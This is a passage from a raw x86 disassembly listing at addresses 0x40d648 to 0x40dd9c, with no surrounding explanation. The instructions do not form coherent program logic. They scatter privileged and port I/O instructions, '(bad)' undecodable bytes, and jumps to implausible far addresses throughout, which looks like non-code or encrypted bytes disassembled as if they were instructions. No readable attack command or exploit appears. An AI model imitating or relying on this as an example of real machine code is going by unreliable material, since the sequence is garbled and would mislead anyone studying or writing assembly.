  40d648:	imul   edx,edx,0x17
  40d64b:	inc    ebp
  40d64c:	mov    ecx,esp
  40d64e:	mov    eax,0x799f3c75
  40d653:	shr    DWORD PTR [esi+ecx*8+0x1e],cl
  40d657:	adc    al,0x8d
  40d659:	pop    es
  40d65a:	mov    bl,BYTE PTR [edi+0x3f]
  40d65d:	jmp    0xb83ef3c3
  40d662:	inc    edx
  40d663:	pop    edi
  40d664:	sahf   
  40d665:	out    0x8e,eax
  40d667:	mul    BYTE PTR [esp+ecx*4-0x16b3faa]
  40d66e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d66f:	call   0x4ca8bb9f
  40d674:	jns    0x40d62f
  40d676:	pop    edx
  40d677:	hlt    
  40d678:	icebp  
  40d679:	enter  0x3006,0xdf
  40d67d:	out    0xc4,eax
  40d67f:	adc    DWORD PTR [esp+ebp*1-0x6ecfa150],eax
  40d686:	cmp    esi,DWORD PTR ds:0x9121dc0a
  40d68c:	push   esp
  40d68d:	inc    esi
  40d68e:	cli    
  40d68f:	dec    ebp
  40d690:	inc    eax
  40d691:	dec    ebx
  40d692:	dec    edx
  40d693:	xor    al,0xdd
  40d695:	mov    ds:0x10352c5b,al
  40d69a:	(bad)  
  40d69b:	dec    esi
  40d69c:	aas    
  40d69d:	cdq    
  40d69e:	stos   DWORD PTR es:[edi],eax
  40d69f:	jb     0x40d62f
  40d6a1:	adc    eax,0xe7a42953
  40d6a6:	int3   
  40d6a7:	add    BYTE PTR [ecx],0x8c
  40d6aa:	and    ecx,eax
  40d6ac:	and    DWORD PTR [ebx],0xffffffe4
  40d6af:	stos   BYTE PTR es:[edi],al
  40d6b0:	(bad)  
  40d6b2:	pop    edx
  40d6b3:	pop    eax
  40d6b4:	pop    esi
  40d6b5:	fiadd  WORD PTR [eax+esi*4+0x60]
  40d6b9:	pop    edi
  40d6ba:	pop    eax
  40d6bb:	sbb    al,0x4e
  40d6bd:	pop    ebx
  40d6be:	arpl   dx,dx
  40d6c0:	jmp    0xcfc2f687
  40d6c5:	cs bnd jae 0x40d707
  40d6c9:	fwait
  40d6ca:	ret    0xc5e5
  40d6cd:	int    0x1a
  40d6cf:	xchg   ebx,eax
  40d6d0:	sahf   
  40d6d1:	loopne 0x40d72b
  40d6d3:	test   eax,0xe8ebf82
  40d6d8:	out    dx,al
  40d6d9:	inc    eax
  40d6da:	fst    DWORD PTR [ebx+0x3e]
  40d6dd:	sub    ebx,DWORD PTR [ebp+0x3a102158]
  40d6e3:	fstp   QWORD PTR [eax-0x19]
  40d6e6:	inc    eax
  40d6e7:	fs js  0x40d753
  40d6ea:	aaa    
  40d6eb:	sbb    eax,0x45487987
  40d6f0:	mov    ecx,0xb6f65b7e
  40d6f5:	in     al,dx
  40d6f6:	pop    ebp
  40d6f7:	scas   al,BYTE PTR es:[edi]
  40d6f8:	in     al,dx
  40d6f9:	or     al,0x86
  40d6fb:	test   BYTE PTR [edx+ebx*1],ch
  40d6fe:	cli    
  40d6ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d700:	iret   
  40d701:	pop    edi
  40d702:	fldcw  WORD PTR [edi+0x58]
  40d705:	mov    ah,BYTE PTR [ecx-0x36]
  40d708:	and    esi,eax
  40d70a:	pop    ebx
  40d70b:	retf   
  40d70c:	in     eax,dx
  40d70d:	in     al,0xbe
  40d70f:	iret   
  40d710:	aas    
  40d711:	enter  0x553b,0x75
  40d715:	push   ebx
  40d716:	mov    ds:0x46ecbd7a,eax
  40d71b:	add    ebx,DWORD PTR [edx+0x209bd426]
  40d721:	mov    ch,0xcc
  40d723:	or     eax,0xe04e7cc
  40d728:	scas   eax,DWORD PTR es:[edi]
  40d729:	pop    eax
  40d72a:	fcomp  st(5)
  40d72c:	test   BYTE PTR [esi+0x2c],bh
  40d72f:	mov    bl,cl
  40d731:	inc    edi
  40d732:	cs fwait
  40d734:	jbe    0x40d7b3
  40d736:	out    dx,al
  40d737:	or     edx,DWORD PTR [eax+0x2c145a42]
  40d73d:	pop    ebx
  40d73e:	in     eax,dx
  40d73f:	out    0xdc,al
  40d741:	in     eax,0xd1
  40d743:	test   bl,dl
  40d745:	cld    
  40d746:	cmp    dl,BYTE PTR [edi+0x65ee61d6]
  40d74c:	mov    esp,0x6b0c5d06
  40d751:	inc    edi
  40d752:	sub    DWORD PTR [ebx+0x23],ebp
  40d755:	in     al,0x82
  40d757:	sbb    ah,BYTE PTR [edx+0x6a248820]
  40d75d:	and    bl,bl
  40d75f:	add    BYTE PTR [ebp+0x4f2b1bb4],bl
  40d765:	fld    TBYTE PTR [ecx-0x15417734]
  40d76b:	xchg   DWORD PTR [ebx+0x240e4688],esi
  40d771:	out    0xaa,eax
  40d773:	mov    ebp,0xa91f1c9c
  40d778:	fstp   DWORD PTR [ebx]
  40d77a:	sbb    BYTE PTR [edx],dl
  40d77c:	sub    esi,esp
  40d77e:	sub    ecx,esp
  40d780:	push   esp
  40d781:	outs   dx,BYTE PTR ds:[esi]
  40d782:	adc    BYTE PTR gs:[ecx+0x5251a2e6],bl
  40d789:	repnz outs dx,BYTE PTR ds:[esi]
  40d78b:	scas   al,BYTE PTR es:[edi]
  40d78c:	dec    DWORD PTR [esi]
  40d78e:	int    0x6
  40d790:	jg     0x40d760
  40d792:	pop    ebx
  40d793:	or     cl,ah
  40d795:	loope  0x40d7d3
  40d797:	push   ebx
  40d798:	loop   0x40d72d
  40d79a:	xchg   edi,eax
  40d79b:	mov    bh,BYTE PTR [edx+0x6]
  40d79e:	or     al,ch
  40d7a0:	stos   BYTE PTR es:[edi],al
  40d7a1:	push   ebx
  40d7a2:	lahf   
  40d7a3:	icebp  
  40d7a4:	pop    ss
  40d7a5:	dec    ebx
  40d7a6:	dec    ebp
  40d7a7:	idiv   BYTE PTR [ecx+0x7c]
  40d7aa:	add    BYTE PTR [ebx+ebx*8-0x7beb771a],al
  40d7b1:	jns    0x40d779
  40d7b3:	xchg   ebx,eax
  40d7b4:	jne    0x40d74a
  40d7b6:	mov    eax,ds:0xe2e7379c
  40d7bb:	sbb    ch,BYTE PTR [esi+0x14]
  40d7be:	imul   ebp,DWORD PTR [edi],0x1b
  40d7c1:	out    0x9a,al
  40d7c3:	fnsave [eax+0x19d2dee2]
  40d7c9:	pop    ds
  40d7ca:	inc    eax
  40d7cb:	xor    dh,BYTE PTR [esp+eax*1]
  40d7ce:	pop    ebx
  40d7cf:	out    dx,al
  40d7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d1:	mov    dh,0xc4
  40d7d3:	cmp    ecx,DWORD PTR [eax]
  40d7d5:	mov    ds:0xf8cd91e3,eax
  40d7da:	retf   0xf9e0
  40d7dd:	cwde   
  40d7de:	push   edi
  40d7df:	lods   al,BYTE PTR ds:[esi]
  40d7e0:	outs   dx,DWORD PTR ds:[esi]
  40d7e1:	loop   0x40d7da
  40d7e3:	push   cs
  40d7e4:	sar    DWORD PTR [ebp-0x26f6e640],0x26
  40d7eb:	adc    BYTE PTR [eax+ebx*8-0x4b],cl
  40d7ef:	inc    edi
  40d7f0:	xor    eax,0xbfc5d662
  40d7f5:	mov    al,ds:0xe78226a7
  40d7fa:	outs   dx,BYTE PTR ds:[esi]
  40d7fb:	jmp    0xc612f692
  40d800:	repnz and cl,bh
  40d803:	mov    dl,0xf7
  40d805:	mov    ebp,0x9fd8ea5a
  40d80a:	in     al,dx
  40d80b:	adc    BYTE PTR [bx+di-0x7976],dh
  40d810:	sahf   
  40d811:	dec    esp
  40d812:	cmp    bh,al
  40d814:	stos   DWORD PTR es:[edi],eax
  40d815:	push   eax
  40d816:	or     al,BYTE PTR [ecx+eiz*4-0x16]
  40d81a:	pop    edx
  40d81b:	adc    BYTE PTR [esi-0x2578a38a],0xc6
  40d822:	mov    WORD PTR [esi-0x7b9967e8],?
  40d828:	xor    BYTE PTR [ebp+0x14],dh
  40d82b:	int3   
  40d82c:	adc    esp,edi
  40d82e:	sub    dh,BYTE PTR [esi+eiz*2-0x196601ba]
  40d835:	adc    BYTE PTR [esi-0x30],cl
  40d838:	enter  0xd15e,0xa8
  40d83c:	and    al,0xb7
  40d83e:	out    dx,eax
  40d83f:	xchg   DWORD PTR [ecx+0x3e],edi
  40d842:	inc    ebp
  40d843:	fist   WORD PTR [ecx]
  40d845:	adc    eax,0xe53fcf28
  40d84a:	pop    es
  40d84b:	lock mov al,0x54
  40d84e:	jbe    0x40d861
  40d850:	fs (bad) 
  40d853:	cld    
  40d854:	jg     0x40d7de
  40d856:	pop    edx
  40d857:	xchg   edi,eax
  40d858:	imul   eax,DWORD PTR [ecx],0x49291930
  40d85e:	pop    edx
  40d85f:	cmp    al,0x93
  40d861:	pop    edx
  40d862:	stos   DWORD PTR es:[edi],eax
  40d863:	pop    edx
  40d864:	mov    ah,0x2f
  40d866:	pop    edi
  40d867:	test   BYTE PTR [ecx+0x3f96c982],dh
  40d86d:	fisttp WORD PTR [ebx*8-0x7d8464f6]
  40d874:	and    al,0xe5
  40d876:	lods   al,BYTE PTR ds:[esi]
  40d877:	fs jecxz 0x40d83e
  40d87a:	ds retf 0x68a
  40d87e:	(bad)  
  40d87f:	sar    DWORD PTR [esi],cl
  40d881:	wbinvd 
  40d883:	push   edx
  40d884:	jo     0x40d893
  40d886:	rcr    DWORD PTR [ebx],cl
  40d888:	and    cl,al
  40d88a:	add    ch,BYTE PTR [edi]
  40d88c:	pusha  
  40d88d:	out    0xfc,eax
  40d88f:	cmp    eax,esp
  40d891:	xor    BYTE PTR [ebp-0x1f032ce8],al
  40d897:	adc    al,BYTE PTR [ebp-0xf]
  40d89a:	pop    esp
  40d89b:	fisub  DWORD PTR [esi+0x77]
  40d89e:	neg    DWORD PTR [esi+edi*4-0x1b676b19]
  40d8a5:	jecxz  0x40d8a1
  40d8a7:	add    DWORD PTR [ebx+ebp*8],esp
  40d8aa:	in     eax,dx
  40d8ab:	pusha  
  40d8ac:	jecxz  0x40d8cb
  40d8ae:	pop    edx
  40d8af:	sahf   
  40d8b0:	jno    0x40d92f
  40d8b2:	in     eax,0xdc
  40d8b4:	fsubr  st,st(0)
  40d8b6:	in     al,0xf5
  40d8b8:	call   0xf010:0x1abc63e7
  40d8bf:	mov    esi,0x6491db3f
  40d8c4:	mov    sp,WORD PTR [eax]
  40d8c7:	in     al,0x1
  40d8c9:	sbb    eax,0xbe99d8d7
  40d8ce:	jmp    0xd8d3:0x4ae667fb
  40d8d5:	(bad)  
  40d8d6:	call   0x441e1836
  40d8db:	repz cmp ebp,DWORD PTR [eax-0x68064e34]
  40d8e2:	xor    al,0xe7
  40d8e4:	sbb    bh,BYTE PTR ds:[edx]
  40d8e7:	add    eax,0x1ebbdf6c
  40d8ec:	aas    
  40d8ed:	jae    0x40d907
  40d8ef:	jno    0x40d907
  40d8f1:	out    dx,eax
  40d8f2:	adc    DWORD PTR [eax],ecx
  40d8f4:	aam    0xe7
  40d8f6:	inc    edx
  40d8f7:	mov    ds:0xa51d7220,al
  40d8fc:	sbb    eax,0x546a5142
  40d901:	adc    al,0x67
  40d903:	cmp    BYTE PTR [ebx+0x38bb5b2f],dh
  40d909:	out    0x6e,al
  40d90b:	call   DWORD PTR [ebx+0x5895d9fd]
  40d911:	add    eax,0xff54e04b
  40d916:	pop    ebx
  40d917:	cli    
  40d918:	xor    eax,0x2086bc7f
  40d91d:	cld    
  40d91e:	and    bh,BYTE PTR [ebp+0x4631fb5]
  40d924:	dec    edx
  40d925:	mov    ds:0x6a62edfc,eax
  40d92a:	pop    edx
  40d92b:	push   ss
  40d92c:	mov    ebx,0x34fe0042
  40d931:	sahf   
  40d932:	fadd   QWORD PTR [ebp-0x2a3c8673]
  40d938:	cmp    al,0x9f
  40d93a:	cmp    eax,0x3709a88d
  40d93f:	(bad)  
  40d941:	cwde   
  40d942:	je     0x40d999
  40d944:	xchg   edi,eax
  40d945:	out    0xc2,al
  40d947:	sbb    eax,0xc7083be8
  40d94c:	xor    al,0xf7
  40d94e:	test   al,0x81
  40d950:	ds cmp eax,0x590ccca0
  40d956:	pop    ebx
  40d957:	adc    DWORD PTR [edi-0x19],ebx
  40d95a:	lock cmp DWORD PTR [ecx],esp
  40d95d:	test   eax,0x5b3a514f
  40d962:	push   cs
  40d963:	pop    es
  40d964:	inc    ecx
  40d965:	es pop edx
  40d967:	je     0x40d907
  40d969:	lock aaa 
  40d96b:	imul   esi,DWORD PTR [edx-0x557bff94],0xffffff85
  40d972:	mov    ebx,0xe1defacd
  40d977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d978:	pop    ebx
  40d979:	push   0xf2fdf05b
  40d97e:	jge    0x40d9bb
  40d980:	mov    dl,0xd8
  40d982:	add    eax,0x39e48486
  40d987:	sbb    BYTE PTR [ebx+0x3e047f0e],bh
  40d98d:	ins    DWORD PTR es:[edi],dx
  40d98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d98f:	push   cs
  40d990:	pause  
  40d992:	push   ecx
  40d993:	fs call 0x4209:0x6f4cdae6
  40d99b:	xlat   BYTE PTR ds:[ebx]
  40d99c:	sub    ah,ah
  40d99e:	mov    ds:0x5b121719,eax
  40d9a3:	adc    al,0xeb
  40d9a5:	(bad)  
  40d9a7:	stos   BYTE PTR es:[edi],al
  40d9a8:	push   0x31
  40d9aa:	add    DWORD PTR [eax+eiz*2+0x3e479765],eax
  40d9b1:	dec    ecx
  40d9b2:	fdivr  QWORD PTR [eax+0x4d]
  40d9b5:	sbb    BYTE PTR [ecx+0xe69087],ah
  40d9bb:	mov    ch,0x7
  40d9bd:	ds inc esi
  40d9bf:	mov    dh,0xf1
  40d9c1:	(bad)  
  40d9c2:	xor    DWORD PTR [edx+edi*2],esp
  40d9c5:	bound  ebx,QWORD PTR [edx+0x6a]
  40d9c8:	stos   BYTE PTR es:[edi],al
  40d9c9:	push   edi
  40d9ca:	bound  ecx,QWORD PTR [esi]
  40d9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9cd:	xchg   edi,eax
  40d9ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9cf:	cwde   
  40d9d0:	jnp    0x40da28
  40d9d2:	pop    ds
  40d9d3:	sar    bh,1
  40d9d5:	retf   0x8d94
  40d9d8:	ds dec ecx
  40d9da:	sub    DWORD PTR [edx],ecx
  40d9dc:	mov    bh,BYTE PTR [ecx-0xe]
  40d9df:	add    eax,0xffbe9934
  40d9e4:	aas    
  40d9e5:	sub    eax,0xace913d9
  40d9ea:	pusha  
  40d9eb:	imul   eax,DWORD PTR [edx],0x49
  40d9ee:	rcr    DWORD PTR [eax+0x7a2e55bf],cl
  40d9f4:	ds repnz sahf 
  40d9f7:	push   0x8b7f4e8a
  40d9fc:	push   ss
  40d9fd:	push   cs
  40d9fe:	sbb    eax,0x344baf5a
  40da03:	add    eax,0x4451e81e
  40da08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da09:	js     0x40da65
  40da0b:	push   esp
  40da0c:	into   
  40da0d:	cdq    
  40da0e:	mov    ah,0xd
  40da10:	mov    ah,0xda
  40da12:	leave  
  40da13:	test   BYTE PTR [edi],ch
  40da15:	shl    DWORD PTR [ebx],cl
  40da17:	fnstsw WORD PTR [edi]
  40da19:	test   edx,esp
  40da1b:	(bad)  
  40da1c:	loopne 0x40da10
  40da1e:	pusha  
  40da1f:	into   
  40da20:	rcl    DWORD PTR [ebx],cl
  40da22:	mov    ds:0xabc1a8f,eax
  40da27:	test   ah,ch
  40da29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da2a:	xor    ebx,DWORD PTR [eax]
  40da2c:	mov    ecx,0xb9bf00de
  40da31:	push   eax
  40da32:	aaa    
  40da33:	xlat   BYTE PTR ds:[ebx]
  40da34:	lahf   
  40da35:	mov    al,0xff
  40da37:	gs jl  0x40da09
  40da3a:	sub    al,0x84
  40da3c:	pushf  
  40da3d:	push   eax
  40da3e:	inc    edi
  40da3f:	mov    ah,0x3e
  40da41:	fwait
  40da42:	not    DWORD PTR [edx-0x14b32671]
  40da48:	push   esp
  40da49:	out    0xc4,al
  40da4b:	arpl   bp,ax
  40da4d:	lsl    edx,WORD PTR [ecx+ecx*1+0x3f2e2511]
  40da55:	int    0x9b
  40da57:	jg     0x40da1a
  40da59:	cmc    
  40da5a:	das    
  40da5b:	std    
  40da5c:	and    eax,0x3e3e789e
  40da61:	addr16 pop eax
  40da63:	dec    edi
  40da64:	pop    eax
  40da65:	add    BYTE PTR [ecx],ch
  40da67:	adc    edx,ebx
  40da69:	adc    ecx,ebp
  40da6b:	scas   al,BYTE PTR es:[edi]
  40da6c:	or     ch,dh
  40da6e:	pop    ebx
  40da6f:	hlt    
  40da70:	mov    esp,DWORD PTR [ebx+0x2f]
  40da73:	or     eax,0x8593f9fc
  40da78:	loop   0x40da2b
  40da7a:	ss lock ds jecxz 0x40daf5
  40da7f:	es fpatan 
  40da82:	fs arpl bp,ax
  40da85:	out    0x2c,eax
  40da87:	pop    ecx
  40da88:	mov    edx,0xaefd9306
  40da8d:	cmp    al,0x11
  40da8f:	xor    DWORD PTR [ecx+0x59825c06],esi
  40da95:	mov    dh,0x91
  40da97:	lea    ecx,[esi+0x55d922e7]
  40da9d:	repnz add DWORD PTR [edx+edx*2+0x71],esi
  40daa2:	icebp  
  40daa3:	inc    ecx
  40daa4:	loop   0x40da67
  40daa6:	pop    ebx
  40daa7:	and    BYTE PTR [eax+0x72b05321],bh
  40daad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daae:	test   DWORD PTR ss:[ebp+0x3f98cdb8],esp
  40dab5:	sub    ebx,DWORD PTR [esi+0x2ee30074]
  40dabb:	and    DWORD PTR [ebp-0x19],ebx
  40dabe:	outs   dx,BYTE PTR ds:[esi]
  40dabf:	inc    edx
  40dac0:	pop    ecx
  40dac1:	pop    ebx
  40dac2:	icebp  
  40dac3:	push   ecx
  40dac4:	jmp    0x3841898a
  40dac9:	lods   al,BYTE PTR ds:[esi]
  40daca:	pop    ebp
  40dacb:	js     0x40daf9
  40dacd:	daa    
  40dace:	xor    DWORD PTR [ebx+0x2f],0xb857eae4
  40dad5:	pushf  
  40dad6:	sbb    BYTE PTR [esi-0x2f72f232],bl
  40dadc:	imul   edi,eax,0x4d
  40dadf:	ins    BYTE PTR es:[edi],dx
  40dae0:	add    ch,0x54
  40dae3:	pusha  
  40dae4:	jge    0x40db1a
  40dae6:	int3   
  40dae7:	dec    edx
  40dae8:	xchg   DWORD PTR [esi+0x18882da0],ecx
  40daee:	add    DWORD PTR [ebx+eax*1+0x2169a2a5],0x17
  40daf6:	xchg   edi,eax
  40daf7:	sub    DWORD PTR [ebx-0x1e],esp
  40dafa:	ds cld 
  40dafc:	test   BYTE PTR [edi-0x60],ah
  40daff:	dec    eax
  40db00:	and    edi,0x2
  40db03:	or     BYTE PTR [edx],dh
  40db05:	or     dh,BYTE PTR [ebx-0x51b3299]
  40db0b:	(bad)  
  40db0c:	push   edx
  40db0d:	out    0x26,al
  40db0f:	xor    BYTE PTR [eax+0x16d8f572],bh
  40db15:	call   0xae517bbc
  40db1a:	or     esi,edx
  40db1c:	fdivr  st(0),st
  40db1e:	mov    bh,0x64
  40db20:	aas    
  40db21:	arpl   dx,dx
  40db23:	or     cl,BYTE PTR [ecx+0x31a4281a]
  40db29:	out    0x74,al
  40db2b:	jo     0x40daf2
  40db2d:	jne    0x40dacc
  40db2f:	es js  0x40db46
  40db32:	pusha  
  40db33:	test   eax,0xe2624a75
  40db38:	lds    eax,FWORD PTR ds:[edx-0x651e49b1]
  40db3f:	sbb    al,0xdc
  40db41:	pop    esi
  40db42:	retf   0x7285
  40db45:	lahf   
  40db46:	sbb    al,0xdb
  40db48:	sar    ah,cl
  40db4a:	push   cs
  40db4b:	ja     0x40dacd
  40db4d:	push   edx
  40db4e:	pop    ebx
  40db4f:	xchg   esi,eax
  40db50:	in     al,dx
  40db51:	mov    ds:0xca94f96f,eax
  40db56:	and    bh,BYTE PTR [ebx+0x439f249]
  40db5c:	retf   0x4c94
  40db5f:	jl     0x40db29
  40db61:	gs pop edx
  40db63:	hlt    
  40db64:	push   edi
  40db65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db66:	pop    edi
  40db67:	test   eax,0x85398c84
  40db6c:	ror    BYTE PTR [ecx+esi*1],1
  40db6f:	cli    
  40db70:	cmp    al,0xa9
  40db72:	ja     0x40dbc6
  40db74:	fimul  DWORD PTR [edi]
  40db76:	xor    cl,BYTE PTR [edi]
  40db78:	jg     0x40db53
  40db7a:	or     eax,0x47d03e63
  40db7f:	test   DWORD PTR [edx+0x3fb7959a],ebp
  40db85:	dec    ebx
  40db86:	cmp    dl,BYTE PTR [edx]
  40db88:	jnp    0x40db4f
  40db8a:	push   ebp
  40db8b:	shl    DWORD PTR [ecx+0x3f7afa7f],1
  40db91:	mov    ebp,0xe8c2da87
  40db96:	mov    esp,0x6f3322de
  40db9b:	inc    ebx
  40db9c:	test   eax,0x68174e5a
  40dba1:	cld    
  40dba2:	ficom  DWORD PTR ds:0x3b6cf577
  40dba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dba9:	cmp    eax,DWORD PTR [ebx-0x68]
  40dbac:	aas    
  40dbad:	fwait
  40dbae:	mov    dh,0xd6
  40dbb0:	mov    bl,bl
  40dbb2:	in     eax,dx
  40dbb3:	lods   al,BYTE PTR ds:[esi]
  40dbb4:	cmc    
  40dbb5:	out    0x72,eax
  40dbb7:	push   ecx
  40dbb8:	std    
  40dbb9:	sbb    eax,0x63f08a50
  40dbbe:	call   0xe55f:0xae693ffe
  40dbc5:	(bad)  
  40dbc7:	out    dx,al
  40dbc8:	pop    edi
  40dbc9:	out    0x42,eax
  40dbcb:	(bad)  
  40dbcc:	lods   al,BYTE PTR ds:[esi]
  40dbcd:	dec    ebx
  40dbce:	pop    ds
  40dbcf:	cdq    
  40dbd0:	mov    bh,0xbd
  40dbd2:	loopne 0x40db86
  40dbd4:	es out 0x28,al
  40dbd7:	int3   
  40dbd8:	(bad)  
  40dbd9:	nop
  40dbda:	jns    0x40dbfc
  40dbdc:	test   al,0xe7
  40dbde:	test   bl,bh
  40dbe0:	dec    ebx
  40dbe1:	test   esp,esp
  40dbe3:	sbb    DWORD PTR [edi+eax*4],ecx
  40dbe6:	mov    edx,0x9b473ede
  40dbeb:	xor    ebp,esi
  40dbed:	dec    ebx
  40dbee:	sbb    BYTE PTR [ebx],0xd2
  40dbf1:	out    0x70,eax
  40dbf3:	into   
  40dbf4:	and    dl,0x10
  40dbf7:	and    eax,0xd4296c72
  40dbfc:	das    
  40dbfd:	sbb    BYTE PTR [edx+0x5a],0xbc
  40dc01:	mov    ah,0xda
  40dc03:	jmp    0x40db9f
  40dc05:	sub    esp,0xffffff85
  40dc08:	mov    dh,0xd5
  40dc0a:	and    DWORD PTR [ecx+0x3f],edx
  40dc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0e:	and    BYTE PTR [eax-0x428c5d3],ah
  40dc14:	setno  dl
  40dc17:	jne    0x40dc57
  40dc19:	mov    DWORD PTR [eax],ecx
  40dc1b:	fld    DWORD PTR [edx+0x7557834]
  40dc21:	xor    edx,DWORD PTR [eax+ebp*2]
  40dc24:	cmp    al,0x4c
  40dc26:	int3   
  40dc27:	daa    
  40dc28:	mov    eax,0x463e21c3
  40dc2d:	fcmovnb st,st(2)
  40dc2f:	pop    ebx
  40dc30:	sbb    esp,DWORD PTR [edi+0x2f]
  40dc33:	xchg   ebx,eax
  40dc34:	cmp    DWORD PTR [edx+0x2a],esp
  40dc37:	fs aas 
  40dc39:	fist   WORD PTR [edx]
  40dc3b:	dec    ebx
  40dc3c:	cmp    dh,BYTE PTR [ebx-0x19f0c2e0]
  40dc42:	shr    BYTE PTR [ebx],0xc7
  40dc45:	jge    0x40dc31
  40dc47:	ins    DWORD PTR es:[edi],dx
  40dc48:	gs jp  0x40dc02
  40dc4b:	rcl    DWORD PTR [ecx],0xe5
  40dc4e:	daa    
  40dc4f:	xchg   edx,eax
  40dc50:	jnp    0x40dc3b
  40dc52:	dec    edi
  40dc53:	lahf   
  40dc54:	in     al,0x94
  40dc56:	(bad)  
  40dc57:	push   0xfffffff1
  40dc59:	pop    ds
  40dc5a:	jmp    0xb085:0xd97e8ae3
  40dc61:	mov    edx,0xf0e753dc
  40dc66:	push   ecx
  40dc67:	je     0x40dc79
  40dc69:	jp     0x40dcc5
  40dc6b:	xor    BYTE PTR [eax-0x21],0x41
  40dc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc70:	in     al,0x35
  40dc72:	dec    esi
  40dc73:	xchg   ebx,eax
  40dc74:	and    bl,dh
  40dc76:	test   eax,0x1acf2f08
  40dc7b:	cmp    BYTE PTR [edx],ah
  40dc7d:	retf   
  40dc7e:	retf   
  40dc7f:	sbb    BYTE PTR [esi],bh
  40dc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc82:	dec    edx
  40dc83:	sti    
  40dc84:	jns    0x40dc20
  40dc86:	leave  
  40dc87:	mov    DWORD PTR [esi],esi
  40dc89:	dec    edx
  40dc8a:	lahf   
  40dc8b:	test   DWORD PTR ds:0x3eaaff88,ecx
  40dc91:	sbb    ecx,DWORD PTR [ebp+0x44]
  40dc94:	mov    bl,0x63
  40dc96:	mov    bh,0x3c
  40dc98:	jae    0x40dc81
  40dc9a:	cmp    al,0x5e
  40dc9c:	lds    eax,FWORD PTR [ecx+esi*1]
  40dc9f:	dec    edi
  40dca0:	mov    ebp,0x89246abf
  40dca5:	popf   
  40dca6:	pop    edx
  40dca7:	dec    esp
  40dca8:	pop    esp
  40dca9:	stos   DWORD PTR es:[edi],eax
  40dcaa:	or     ebx,DWORD PTR [edx+0x36]
  40dcad:	xchg   ecx,eax
  40dcae:	xchg   ebp,eax
  40dcaf:	test   edi,edi
  40dcb1:	xor    cl,BYTE PTR ds:0x61e33ea8
  40dcb7:	and    DWORD PTR [eax-0x5e],0x57
  40dcbb:	mov    ds:0x6d2ee9b1,eax
  40dcc0:	adc    al,0xde
  40dcc2:	xor    eax,0xae0626e1
  40dcc7:	or     ah,BYTE PTR [ecx-0x3b798011]
  40dccd:	pop    ss
  40dcce:	inc    esp
  40dccf:	and    ch,cl
  40dcd1:	out    0xe9,eax
  40dcd3:	(bad)  
  40dcd4:	in     eax,0x20
  40dcd6:	push   0x59
  40dcd8:	push   ss
  40dcd9:	ret    
  40dcda:	out    0x5a,al
  40dcdc:	shl    esi,cl
  40dcde:	jmp    0x2af0:0x349902e5
  40dce5:	xor    DWORD PTR [ecx+0x19],ebx
  40dce8:	push   edi
  40dce9:	or     BYTE PTR [ebx],bh
  40dceb:	loop   0x40dd34
  40dced:	push   ds
  40dcee:	pop    ebx
  40dcef:	xor    ch,BYTE PTR [ecx-0x19]
  40dcf2:	add    al,0x22
  40dcf4:	repz pop ebx
  40dcf6:	dec    ebp
  40dcf7:	fst    QWORD PTR [eax-0x234108d1]
  40dcfd:	or     bl,BYTE PTR [eax+0x20]
  40dd00:	push   cs
  40dd01:	xor    ecx,DWORD PTR [ecx]
  40dd03:	sbb    BYTE PTR [ecx+0x3303bb00],0xe6
  40dd0a:	sbb    BYTE PTR [ebp-0x35],0x52
  40dd0e:	pop    es
  40dd0f:	sub    eax,ebp
  40dd11:	push   es
  40dd12:	ins    BYTE PTR es:[edi],dx
  40dd13:	rol    DWORD PTR [esi-0x1a],cl
  40dd16:	sub    eax,0x1ad3d256
  40dd1b:	dec    edx
  40dd1c:	cmp    dh,ah
  40dd1e:	pop    esi
  40dd1f:	jge    0x40dd61
  40dd21:	out    dx,al
  40dd22:	mov    ah,0x51
  40dd24:	push   0x2dc9756
  40dd29:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd2b:	inc    ebp
  40dd2c:	mov    edi,0x530eef11
  40dd31:	mov    bh,BYTE PTR [edx+0x2a]
  40dd34:	lods   al,BYTE PTR ds:[esi]
  40dd35:	and    DWORD PTR [edi+0x59f8a584],ebp
  40dd3b:	pushf  
  40dd3c:	ds add eax,0x5454f41
  40dd42:	inc    esi
  40dd43:	std    
  40dd44:	ror    DWORD PTR [esi],0x5c
  40dd47:	mov    dl,0x82
  40dd49:	cdq    
  40dd4a:	mov    BYTE PTR [edi+0x451c821c],0x6a
  40dd51:	jae    0x40ddae
  40dd53:	gs fxch st(0)
  40dd56:	pop    edx
  40dd57:	mov    WORD PTR [ebp+0x2ea34e65],ds
  40dd5d:	xor    dh,BYTE PTR [esi]
  40dd5f:	mov    eax,edi
  40dd61:	inc    esi
  40dd62:	loopne 0x40ddaf
  40dd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd65:	dec    ebp
  40dd66:	sub    cl,BYTE PTR [ecx+0x27]
  40dd69:	out    0x2c,al
  40dd6b:	sbb    al,0x93
  40dd6d:	in     al,0x2c
  40dd6f:	jo     0x40dd13
  40dd71:	hlt    
  40dd72:	jmp    0x113b:0x7ae8aaff
  40dd79:	push   es
  40dd7a:	pop    edx
  40dd7b:	push   edx
  40dd7c:	aas    
  40dd7d:	jge    0x40dd5c
  40dd7f:	add    eax,0xf0491775
  40dd84:	ja     0x40dd6c
  40dd86:	and    bh,BYTE PTR [ebp+0x72b08a57]
  40dd8c:	dec    eax
  40dd8d:	arpl   ax,si
  40dd8f:	pop    ecx
  40dd90:	daa    
  40dd91:	je     0x40ddf4
  40dd93:	mov    al,ds:0x85a31319
  40dd98:	shl    BYTE PTR [eax+0x0],cl
  40dd9b:	(bad)  
  40dd9c:	sub    al,0xa2
